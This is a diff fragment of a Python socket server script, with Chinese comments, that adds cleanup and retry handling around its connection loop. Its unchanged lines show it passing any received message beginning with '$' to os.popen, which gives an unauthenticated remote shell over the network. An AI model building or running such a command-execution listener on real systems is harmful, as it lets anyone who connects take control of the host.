@@ -27,7 +27,9 @@ while 1:
             if len(data)<=0 or data=="\n" or data=="\r" or data=="":
                 print("对方发送了空数据")
                 data2="你发送了空数据"
-            
+                conn.close()  # 断开连接
+                s.close()  # 关闭套结字
+                break
             elif (data[0]=="$"):
                 data=data.replace("$","")
                 f = os.popen(data)  # 可以将命令的内容以读取的方式返回
@@ -66,10 +68,15 @@ while 1:
         except ConnectionResetError:
             print("远程主机强迫关闭了一个现有的连接。")
             time.sleep(1)
+            conn.close()  # 断开连接
+            s.close()  # 关闭套结字
             break
         except OSError:
             print("OSError: [WinError 10038] 在一个非套接字上尝试了一个操作。")
             time.sleep(1)
+            conn.close()  # 断开连接
+            s.close()  # 关闭套结字
             break
-    conn.close()  # 断开连接
-    s.close()  # 关闭套结字
+        time.sleep(1)
+    time.sleep(3)
+
